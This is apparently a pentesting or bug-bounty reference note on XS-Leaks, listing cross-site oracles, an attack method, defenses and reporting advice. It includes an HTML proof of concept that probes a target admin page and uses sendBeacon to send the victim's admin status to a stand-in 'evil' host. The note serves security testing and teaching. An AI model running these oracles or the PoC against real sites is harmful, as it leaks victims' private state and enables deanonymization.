# XS-Leaks (Cross-Site Leaks)

**What it is:** A malicious page infers *private* state about a victim on another site by observing side effects of cross-origin interactions the browser still permits — timing, event firing, frame counts, cache, resource sizes. No data is read directly (SOP holds); you leak **one bit at a time** (is-logged-in? is-admin? does-search-return-results? is-this-user-my-friend?). Under-tested, and browser side-channels keep opening new oracles.

## Where it bites
- Search/filter endpoints that reveal existence ("do you have a message from X?", "is user Y in your org?").
- Auth/role-dependent pages (200 vs 302-to-login, admin vs member layout).
- Anything where the *response differs by victim state* and you can trigger it cross-site with the victim's cookies.

## Oracles (how you read the bit)
- [ ] **Status-code / error-vs-load:** embed the target as `<script>`/`<img>`/`<link>`/`<iframe>` and listen for `onload` vs `onerror` — 200 fires one, 4xx/5xx the other. Reveals auth/authz/existence.
- [ ] **Redirect detection:** a `302→/login` (unauth) vs `200` (auth) changes whether a resource loads / how many redirects occur; `fetch` `redirect:manual`/opaque-response differences.
- [ ] **Frame counting (`window.length`):** open the target in a popup/iframe and read `win.length` — number of subframes leaks state (e.g. logged-in pages embed more frames).
- [ ] **Timing (the workhorse):** measure cross-origin request time (`performance`/event timing) — cache hit vs miss, heavy query vs empty result, server-side branch. Amplify with many samples.
- [ ] **Cache probing:** force-evict then time a resource load to tell whether the victim's browser had it cached (they visited page X / are entitled to asset Y).
- [ ] **`COOP`/`COEP`/`CORP` gaps:** missing COOP → read `window.opener`/`window.length` post-navigation; missing CORP → embed their resources for size/timing.
- [ ] **`id`/fragment + scroll / focus:** `#fragment` navigation or `:target` styling + focus events leak whether an element/text exists on the victim's page.
- [ ] **Response-size via cache/quota or `Content-Length` in permissive modes;** connection-count / socket-pool exhaustion timing.
- [ ] **`SharedArrayBuffer`/high-res timers** (where cross-origin isolation is off) for fine timing.

## Method
1. Find a page whose response **differs by victim state** (auth, role, membership, has-item, search-hit).
2. Pick an oracle the site's headers allow (missing COOP/CORP/`X-Frame-Options`, cacheable resource, `SameSite` cookie still sent).
3. Trigger it from your attacker page with the victim's ambient cookies; read the side effect.
4. Repeat to turn 1 bit into full data (binary-search a search endpoint char-by-char).

## Defenses that kill it (so absence = live oracle)
`SameSite=Lax/Strict` cookies (no ambient auth cross-site), `COOP: same-origin`, `CORP`/`COEP`, `X-Frame-Options`/`frame-ancestors`, `Cache-Control` on private responses, `Vary`, and constant-time/uniform responses. Note which are missing.

## 🎯 PoC pattern (status oracle — is the victim an admin?)
Attacker page:
```html
<script>
 const t = "https://target.com/admin/dashboard";   // 200 for admin, 302→/login otherwise
 const img = new Image();
 img.onload  = () => navigator.sendBeacon("https://evil/leak?admin=1");
 img.onerror = () => navigator.sendBeacon("https://evil/leak?admin=0");
 img.src = t;   // loaded with the victim's SameSite=None cookies
</script>
```
The load/error branch leaks the victim's admin state cross-site — no response body read.

## Impact
Privacy breach (deanonymization, membership/relationship/PII inference), search-content exfil bit-by-bit, targeting for a follow-up attack. Severity depends on the sensitivity of the leaked state; often P3–P4 alone, higher when it leaks identity/PII or chains into an attack.

## Report notes
Show the oracle distinguishing two victim states you control (admin vs member, has-secret vs not), the ambient-cookie requirement, and the missing header that permits it. Keep it to your own accounts; don't deanonymize real users.

## Tools
Manual JS PoC, `performance` API, Burp for header review, xsleaks.dev oracle catalog.

## Sources
xsleaks.dev wiki (oracle taxonomy); Google Security "XS-Leaks"; PortSwigger research.

## Related
`05-client-side/03-clickjacking.md` · `05-client-side/06-security-headers-bypass.md` · `09-advanced/05-dangling-markup-and-css-injection.md` · `08-infra/03-cache-poisoning-and-deception.md`
